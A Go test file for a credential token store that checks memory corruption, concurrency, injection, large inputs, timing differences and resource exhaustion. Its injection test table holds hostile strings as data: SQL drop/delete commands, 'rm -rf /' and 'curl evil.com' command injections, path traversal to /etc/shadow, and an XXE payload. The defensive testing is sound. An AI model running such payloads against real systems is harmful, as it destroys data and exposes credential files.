package secure

import (
	"context"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/actual-software/mcp-bridge/services/router/internal/constants"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestCredentialStore_SecurityEdgeCases tests various security edge cases.
// Uses mock store for fast, reliable edge case testing without external dependencies.
func TestCredentialStore_SecurityEdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		setupFunc   func(t *testing.T) TokenStore
		testFunc    func(t *testing.T, store TokenStore)
		cleanupFunc func(t *testing.T, store TokenStore)
	}{
		{
			name:      "memory corruption protection",
			setupFunc: setupMockStore,
			testFunc:  testMemoryCorruptionProtection,
		},
		{
			name:      "concurrent access safety",
			setupFunc: setupMockStore,
			testFunc:  testConcurrentAccessSafety,
		},
		{
			name:      "injection attack protection",
			setupFunc: setupMockStore,
			testFunc:  testInjectionAttackProtection,
		},
		{
			name:      "buffer overflow protection",
			setupFunc: setupMockStore,
			testFunc:  testBufferOverflowProtection,
		},
		{
			name:      "timing attack resistance",
			setupFunc: setupMockStore,
			testFunc:  testTimingAttackResistance,
		},
		{
			name:      "resource exhaustion handling",
			setupFunc: setupMockStore,
			testFunc:  testResourceExhaustionHandling,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			store := tt.setupFunc(t)
			if store == nil {
				t.Skip("Store setup failed - platform may not support this store type")
			}

			// Run the test.
			tt.testFunc(t, store)

			// Cleanup if provided.
			if tt.cleanupFunc != nil {
				tt.cleanupFunc(t, store)
			}
		})
	}
}

//nolint:ireturn // Test helper requires interface return
func setupMockStore(t *testing.T) TokenStore {
	t.Helper()

	return newMockStore()
}

//nolint:ireturn // Test helper requires interface return
func setupCredentialStore(t *testing.T) TokenStore {
	t.Helper()

	store, err := NewTokenStore(fmt.Sprintf("security-test-%d", time.Now().UnixNano()))
	if err != nil {
		t.Logf("Failed to create token store: %v", err)

		return nil
	}

	return store
}

type memoryCorruptionTest struct {
	name  string
	key   string
	token string
}

func getMemoryCorruptionTests() []memoryCorruptionTest {
	return []memoryCorruptionTest{
		{
			name:  "null byte injection in key",
			key:   "test\x00key",
			token: "safe-token",
		},
		{
			name:  "null byte injection in token",
			key:   "safe-key",
			token: "test\x00token",
		},
		{
			name:  "format string injection in key",
			key:   "test%s%x%n",
			token: "safe-token",
		},
		{
			name:  "format string injection in token",
			key:   "safe-key",
			token: "test%s%x%n",
		},
		{
			name:  "binary data in key",
			key:   string([]byte{0x01, 0x02, 0x03, 0xFF, 0xFE, 0xFD}),
			token: "safe-token",
		},
		{
			name:  "binary data in token",
			key:   "safe-key",
			token: string([]byte{0x01, 0x02, 0x03, 0xFF, 0xFE, 0xFD}),
		},
	}
}

func testSingleMemoryCorruptionCase(t *testing.T, store TokenStore, tt memoryCorruptionTest) {
	t.Helper()
	// Should handle gracefully without crashing.
	err := store.Store(tt.key, tt.token)
	// Error is acceptable for malformed input.
	if err != nil {
		t.Logf("Store rejected malformed input (expected): %v", err)

		return
	}

	// If store succeeded, retrieve should work and match.
	retrieved, err := store.Retrieve(tt.key)
	if err != nil {
		t.Logf("Retrieve failed for stored malformed data: %v", err)

		return
	}

	// For binary data, JSON encoding may transform the data.
	// so we need to be more flexible in our assertion
	if tt.name == "binary data in token" || tt.name == "binary data in key" {
		// For binary data, verify the length is preserved at minimum.
		assert.NotEmpty(t, retrieved, "Retrieved token should not be empty")
		// The exact format may vary due to JSON encoding, which is acceptable.
	} else {
		assert.Equal(t, tt.token, retrieved, "Retrieved token should match stored token")
	}

	// Cleanup.
	if err := store.Delete(tt.key); err != nil {
		t.Logf("Failed to delete from store: %v", err)
	}
}

func testMemoryCorruptionProtection(t *testing.T, store TokenStore) {
	t.Helper()
	tests := getMemoryCorruptionTests()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			testSingleMemoryCorruptionCase(t, store, tt)
		})
	}
}

func runConcurrentOperations(store TokenStore, numGoroutines, numOperations int) []error {
	var wg sync.WaitGroup
	errors := make([]error, numGoroutines*numOperations*3) // 3 operations per iteration
	errorIndex := int64(0)

	// Use atomic operations for error index.
	var mu sync.Mutex

	appendError := func(err error) {
		mu.Lock()
		errors[errorIndex] = err
		errorIndex++
		mu.Unlock()
	}

	// Concurrent mixed operations.
	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(goroutineID int) {
			defer wg.Done()
			performConcurrentOperations(store, goroutineID, numOperations, appendError)
		}(i)
	}

	wg.Wait()

	return errors[:errorIndex]
}

func performConcurrentOperations(store TokenStore, goroutineID, numOperations int, appendError func(error)) {
	for j := 0; j < numOperations; j++ {
		key := fmt.Sprintf("concurrent-key-%d-%d", goroutineID, j)
		token := fmt.Sprintf("concurrent-token-%d-%d", goroutineID, j)

		// Store.
		err := store.Store(key, token)
		appendError(err)

		// Retrieve.
		retrieved, err := store.Retrieve(key)
		appendError(err)

		if err == nil && retrieved != token {
			appendError(fmt.Errorf("token mismatch: expected %s, got %s", token, retrieved))
		}

		// Delete.
		err = store.Delete(key)
		appendError(err)
	}
}

func verifyConcurrentAccessResults(t *testing.T, errors []error, numGoroutines, numOperations int) {
	t.Helper()
	// Check for race conditions or errors.
	errorCount := 0

	for i, err := range errors {
		if err != nil {
			errorCount++
			if errorCount <= 5 { // Log first few errors
				t.Logf("Concurrent operation error %d: %v", i, err)
			}
		}
	}

	// Allow some errors but not excessive failures.
	totalOps := numGoroutines * numOperations * 3
	failureRate := float64(errorCount) / float64(totalOps)
	assert.Less(t, failureRate, 0.1, "Failure rate should be less than 10%")
}

func testConcurrentAccessSafety(t *testing.T, store TokenStore) {
	t.Helper()
	const (
		numGoroutines = 10
		numOperations = 5
	)

	errors := runConcurrentOperations(store, numGoroutines, numOperations)
	verifyConcurrentAccessResults(t, errors, numGoroutines, numOperations)
}

type injectionAttackTest struct {
	name    string
	key     string
	token   string
	comment string
}

func getInjectionAttackTests() []injectionAttackTest {
	return []injectionAttackTest{
		{
			name:    "SQL injection in key",
			key:     "'; DROP TABLE credentials; --",
			token:   "safe-token",
			comment: "Should not cause SQL injection",
		},
		{
			name:    "SQL injection in token",
			key:     "safe-key",
			token:   "'; DELETE FROM credentials WHERE 1=1; --",
			comment: "Should not cause SQL injection",
		},
		{
			name:    "Command injection in key",
			key:     "test; rm -rf /; echo",
			token:   "safe-token",
			comment: "Should not execute system commands",
		},
		{
			name:    "Command injection in token",
			key:     "safe-key",
			token:   "token; curl evil.com; echo",
			comment: "Should not execute system commands",
		},
		{
			name:    "Path traversal in key",
			key:     "../../../etc/passwd",
			token:   "safe-token",
			comment: "Should not access arbitrary files",
		},
		{
			name:    "Path traversal in token",
			key:     "safe-key",
			token:   "../../../etc/shadow",
			comment: "Should not access arbitrary files",
		},
		{
			name:    "LDAP injection in key",
			key:     "*)(uid=*))(|(uid=*",
			token:   "safe-token",
			comment: "Should not cause LDAP injection",
		},
		{
			name:    "XML injection in token",
			key:     "safe-key",
			token:   "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
			comment: "Should not parse as XML",
		},
	}
}

func testSingleInjectionAttack(t *testing.T, store TokenStore, tt injectionAttackTest) {
	t.Helper()
	// Store should handle injection attempts safely.
	err := store.Store(tt.key, tt.token)
	if err != nil {
		t.Logf("Store rejected injection attempt (acceptable): %v", err)

		return
	}

	// If store succeeded, retrieve should work safely.
	retrieved, err := store.Retrieve(tt.key)
	if err != nil {
		t.Logf("Retrieve failed (acceptable for injection test): %v", err)

		return
	}

	// Token should be stored as-is, not interpreted.
	assert.Equal(t, tt.token, retrieved, "Token should be stored literally")

	// Cleanup.
	if err := store.Delete(tt.key); err != nil {
		t.Logf("Failed to delete from store: %v", err)
	}
}

func testInjectionAttackProtection(t *testing.T, store TokenStore) {
	t.Helper()
	injectionTests := getInjectionAttackTests()

	for _, tt := range injectionTests {
		t.Run(tt.name, func(t *testing.T) {
			testSingleInjectionAttack(t, store, tt)
		})
	}
}

func testBufferOverflowProtection(t *testing.T, store TokenStore) {
	t.Helper()
	// Test protection against buffer overflow attacks.
	sizes := []int{
		1024,     // 1KB
		10240,    // 10KB
		102400,   // 100KB
		1048576,  // 1MB
		10485760, // 10MB (if platform supports it)
	}

	for _, size := range sizes {
		t.Run(fmt.Sprintf("size_%d_bytes", size), func(t *testing.T) {
			// Create large key and token.
			largeKey := strings.Repeat("k", size/2)
			largeToken := strings.Repeat("t", size)

			// Should handle large inputs gracefully.
			err := store.Store(largeKey, largeToken)
			if err != nil {
				// Platform may have size limits - this is acceptable.
				t.Logf("Store rejected large input (size %d): %v", size, err)

				return
			}

			// If store succeeded, retrieve should work.
			retrieved, err := store.Retrieve(largeKey)
			if err != nil {
				t.Errorf("Failed to retrieve large token (size %d): %v", size, err)

				return
			}

			assert.Equal(t, largeToken, retrieved, "Large token should be stored correctly")

			// Cleanup.
			if err := store.Delete(largeKey); err != nil {
				t.Logf("Failed to delete from store: %v", err)
			}
		})
	}
}

func testTimingAttackResistance(t *testing.T, store TokenStore) {
	t.Helper()

	if testing.Short() {
		t.Skip("Skipping timing attack test in short mode")
	}

	existingKeys, cleanup := setupTimingAttackTest(t, store)
	defer cleanup()

	iterations := 100
	existingTimes, nonExistingTimes := measureRetrievalTimes(store, iterations)

	analyzeTimingAttackVulnerability(t, existingTimes, nonExistingTimes)

	_ = existingKeys // Suppress unused variable
}

// setupTimingAttackTest stores test tokens and returns cleanup function.
func setupTimingAttackTest(t *testing.T, store TokenStore) ([]string, func()) {
	t.Helper()

	existingKeys := []string{"existing-1", "existing-2", "existing-3"}
	for _, key := range existingKeys {
		err := store.Store(key, "test-token")
		require.NoError(t, err)
	}

	cleanup := func() {
		for _, key := range existingKeys {
			if err := store.Delete(key); err != nil {
				t.Logf("Failed to delete from store: %v", key)
			}
		}
	}

	return existingKeys, cleanup
}

// measureRetrievalTimes measures timing for existing and non-existing key retrievals.
func measureRetrievalTimes(store TokenStore, iterations int) ([]time.Duration, []time.Duration) {
	existingTimes := make([]time.Duration, 0)
	nonExistingTimes := make([]time.Duration, 0)

	for i := 0; i < iterations; i++ {
		existingTime := measureExistingKeyRetrieval(store)
		if existingTime > 0 {
			existingTimes = append(existingTimes, existingTime)
		}

		nonExistingTime := measureNonExistingKeyRetrieval(store)
		if nonExistingTime > 0 {
			nonExistingTimes = append(nonExistingTimes, nonExistingTime)
		}
	}

	return existingTimes, nonExistingTimes
}

// measureExistingKeyRetrieval measures time to retrieve an existing key.
func measureExistingKeyRetrieval(store TokenStore) time.Duration {
	start := time.Now()
	_, err := store.Retrieve("existing-1")
	elapsed := time.Since(start)

	if err == nil {
		return elapsed
	}

	return 0
}

// measureNonExistingKeyRetrieval measures time to retrieve a non-existing key.
func measureNonExistingKeyRetrieval(store TokenStore) time.Duration {
	start := time.Now()
	_, err := store.Retrieve("non-existing-key")
	elapsed := time.Since(start)

	if err != nil { // Expected to fail
		return elapsed
	}

	return 0
}

// analyzeTimingAttackVulnerability analyzes and reports timing differences.
func analyzeTimingAttackVulnerability(t *testing.T, existingTimes, nonExistingTimes []time.Duration) {
	t.Helper()

	if len(existingTimes) > 0 && len(nonExistingTimes) > 0 {
		avgExisting := averageDuration(existingTimes)
		avgNonExisting := averageDuration(nonExistingTimes)

		t.Logf("Average existing key retrieval time: %v", avgExisting)
		t.Logf("Average non-existing key retrieval time: %v", avgNonExisting)

		// The timing difference should not be excessive (within 10x).
		ratio := float64(avgNonExisting) / float64(avgExisting)
		if ratio > 10 || ratio < 0.1 {
			t.Logf("Warning: Significant timing difference detected (ratio: %.2f)", ratio)
		}
	}
}

func testResourceExhaustionHandling(t *testing.T, store TokenStore) {
	t.Helper()
	// Test handling of resource exhaustion scenarios
	if testing.Short() {
		t.Skip("Skipping resource exhaustion test in short mode")
	}

	// Test 1: Many small operations
	t.Run("many_small_operations", func(t *testing.T) {
		runManySmallOperationsTest(t, store)
	})

	// Test 2: Memory pressure
	t.Run("memory_pressure", func(t *testing.T) {
		runMemoryPressureTest(t, store)
	})
}

func runManySmallOperationsTest(t *testing.T, store TokenStore) {
	t.Helper()

	const numKeys = 1000

	keys := storeMultipleSmallTokens(t, store, numKeys)

	retrievedCount := retrieveAllStoredTokens(t, store, keys)
	t.Logf("Successfully stored and retrieved %d/%d keys", retrievedCount, numKeys)

	cleanupStoredKeys(t, store, keys)
}

func storeMultipleSmallTokens(t *testing.T, store TokenStore, numKeys int) []string {
	t.Helper()

	keys := make([]string, numKeys)

	// Store many small tokens
	for i := 0; i < numKeys; i++ {
		key := fmt.Sprintf("resource-test-%d", i)
		token := fmt.Sprintf("token-%d", i)
		keys[i] = key

		err := store.Store(key, token)
		if err != nil {
			t.Logf("Store failed at key %d (resource limits?): %v", i, err)

			break
		}
	}

	return keys
}

func retrieveAllStoredTokens(t *testing.T, store TokenStore, keys []string) int {
	t.Helper()

	retrievedCount := 0

	for _, key := range keys {
		if key == "" {
			continue
		}

		_, err := store.Retrieve(key)
		if err == nil {
			retrievedCount++
		}
	}

	return retrievedCount
}

func cleanupStoredKeys(t *testing.T, store TokenStore, keys []string) {
	t.Helper()

	for _, key := range keys {
		if key != "" {
			if err := store.Delete(key); err != nil {
				t.Logf("Failed to delete from store: %v", err)
			}
		}
	}
}

func runMemoryPressureTest(t *testing.T, store TokenStore) {
	t.Helper()

	// Force garbage collection before test
	runtime.GC()

	var memStatsBefore runtime.MemStats
	runtime.ReadMemStats(&memStatsBefore)

	storedKeys := storeLargeTokensForMemoryPressure(t, store)

	var memStatsAfter runtime.MemStats
	runtime.ReadMemStats(&memStatsAfter)

	logMemoryPressureResults(t, storedKeys, memStatsBefore, memStatsAfter)

	cleanupStoredKeys(t, store, storedKeys)
	runtime.GC()
}

func storeLargeTokensForMemoryPressure(t *testing.T, store TokenStore) []string {
	t.Helper()

	// Create large tokens to pressure memory
	const largeTokenSize = 100000 // 100KB

	largeToken := strings.Repeat("x", largeTokenSize)
	storedKeys := make([]string, 0)

	for i := 0; i < constants.TestConcurrentRoutines; i++ { // Try to store 100 * 100KB = 10MB
		key := fmt.Sprintf("memory-pressure-%d", i)

		err := store.Store(key, largeToken)
		if err != nil {
			t.Logf("Store failed at iteration %d (memory pressure?): %v", i, err)

			break
		}

		storedKeys = append(storedKeys, key)
	}

	return storedKeys
}

func logMemoryPressureResults(t *testing.T, storedKeys []string, memStatsBefore, memStatsAfter runtime.MemStats) {
	t.Helper()

	t.Logf("Stored %d large tokens", len(storedKeys))
	t.Logf("Memory usage before: %d KB", memStatsBefore.Alloc/1024)
	t.Logf("Memory usage after: %d KB", memStatsAfter.Alloc/1024)
}

func TestCredentialStore_ErrorBoundaryConditions(t *testing.T) {
	store := setupCredentialStore(t)
	if store == nil {
		t.Skip("Store setup failed")
	}

	// Test error boundary conditions.
	tests := []struct {
		name     string
		testFunc func(t *testing.T, store TokenStore)
	}{
		{
			name:     "context cancellation",
			testFunc: testContextCancellation,
		},
		{
			name:     "system resource limits",
			testFunc: testSystemResourceLimits,
		},
		{
			name:     "platform specific errors",
			testFunc: testPlatformSpecificErrors,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.testFunc(t, store)
		})
	}
}

func testContextCancellation(t *testing.T, store TokenStore) {
	t.Helper()
	// Test behavior with context cancellation (if supported).
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Millisecond)
	defer cancel()

	// Wait for context to be cancelled.
	<-ctx.Done()

	// Operations should still work (credential stores typically don't use context).
	// but this tests resilience when called from cancelled contexts
	err := store.Store("context-test", "test-token")
	if err != nil {
		t.Logf("Store operation with cancelled context: %v", err)
	}

	_, err = store.Retrieve("context-test")
	if err != nil {
		t.Logf("Retrieve operation with cancelled context: %v", err)
	}

	err = store.Delete("context-test")
	if err != nil {
		t.Logf("Delete operation with cancelled context: %v", err)
	}
}

func testSystemResourceLimits(t *testing.T, store TokenStore) {
	t.Helper()
	// Test behavior when approaching system limits.

	// Test file descriptor limits (if applicable).
	t.Run("file_descriptor_limits", func(t *testing.T) {
		// Try to create many concurrent operations.
		const concurrency = 100

		var wg sync.WaitGroup

		for i := 0; i < concurrency; i++ {
			wg.Add(1)

			go func(id int) {
				defer wg.Done()

				key := fmt.Sprintf("fd-test-%d", id)
				token := fmt.Sprintf("token-%d", id)

				// Multiple operations to stress file descriptor usage.
				_ = store.Store(key, token)

				_, _ = store.Retrieve(key)
				if err := store.Delete(key); err != nil {
					t.Logf("Failed to delete from store: %v", err)
				}
			}(i)
		}

		wg.Wait()
		t.Log("File descriptor stress test completed")
	})

	// Test disk space limits (if applicable).
	t.Run("disk_space_limits", func(t *testing.T) {
		// Try to store progressively larger tokens.
		for size := 1024; size <= 1048576; size *= 2 {
			largeToken := strings.Repeat("d", size)
			key := fmt.Sprintf("disk-test-%d", size)

			err := store.Store(key, largeToken)
			if err != nil {
				t.Logf("Store failed at size %d (disk limits?): %v", size, err)

				break
			}

			// Cleanup immediately to avoid filling disk.
			if err := store.Delete(key); err != nil {
				t.Logf("Failed to delete from store: %v", err)
			}
		}
	})
}

func testPlatformSpecificErrors(t *testing.T, store TokenStore) {
	t.Helper()
	// Test platform-specific error conditions.
	switch runtime.GOOS {
	case "windows":
		testWindowsSpecificErrors(t, store)
	case "darwin":
		testMacOSSpecificErrors(t, store)
	case "linux":
		testLinuxSpecificErrors(t, store)
	default:
		t.Logf("No platform-specific tests for %s", runtime.GOOS)
	}
}

func testWindowsSpecificErrors(t *testing.T, store TokenStore) {
	t.Helper()
	// Test Windows Credential Manager specific errors.
	t.Log("Testing Windows-specific error conditions")

	// Test with very long target names (Windows has limits).
	longKey := strings.Repeat("a", 1000)

	err := store.Store(longKey, "test-token")
	if err != nil {
		t.Logf("Long key rejected (expected): %v", err)
	}
}

func testMacOSSpecificErrors(t *testing.T, store TokenStore) {
	t.Helper()
	// Test macOS Keychain specific errors.
	t.Log("Testing macOS-specific error conditions")

	// Keychain may have different limits or behaviors.
	// This is a placeholder for macOS-specific tests.
}

func testLinuxSpecificErrors(t *testing.T, store TokenStore) {
	t.Helper()
	// Test Linux Secret Service specific errors.
	t.Log("Testing Linux-specific error conditions")

	// Secret Service may have different limits or behaviors.
	// This is a placeholder for Linux-specific tests.
}

// Helper functions.

func averageDuration(durations []time.Duration) time.Duration {
	if len(durations) == 0 {
		return 0
	}

	var total time.Duration
	for _, d := range durations {
		total += d
	}

	return total / time.Duration(len(durations))
}

// Benchmark security-related operations.
//
//nolint:ireturn // setupCredentialStoreForBench returns interface for test helper
func BenchmarkCredentialStore_SecurityOperations(b *testing.B) {
	store := setupCredentialStoreForBench(b)
	if store == nil {
		b.Skip("Store setup failed")
	}

	b.Run("concurrent_stores", func(b *testing.B) {
		b.RunParallel(func(pb *testing.PB) {
			i := 0
			for pb.Next() {
				key := fmt.Sprintf("bench-key-%d", i)
				token := fmt.Sprintf("bench-token-%d", i)
				_ = store.Store(key, token)
				i++
			}
		})
	})

	b.Run("large_token_store", func(b *testing.B) {
		largeToken := strings.Repeat("x", 10240) // 10KB token

		for i := 0; i < b.N; i++ {
			key := fmt.Sprintf("large-bench-key-%d", i)
			_ = store.Store(key, largeToken)
		}
	})

	b.Run("malformed_input_handling", func(b *testing.B) {
		malformedKey := "test\x00\xFF\xFE"

		malformedToken := "token\x00\xFF\xFE"
		for i := 0; i < b.N; i++ {
			_ = store.Store(malformedKey, malformedToken)
		}
	})
}

// Helper for testing.B.
//
//nolint:ireturn // Test helper requires interface return.
func setupCredentialStoreForBench(b *testing.B) TokenStore {
	b.Helper()

	store, err := NewTokenStore(fmt.Sprintf("security-test-%d", time.Now().UnixNano()))
	if err != nil {
		b.Logf("Failed to create token store: %v", err)

		return nil
	}

	return store
}
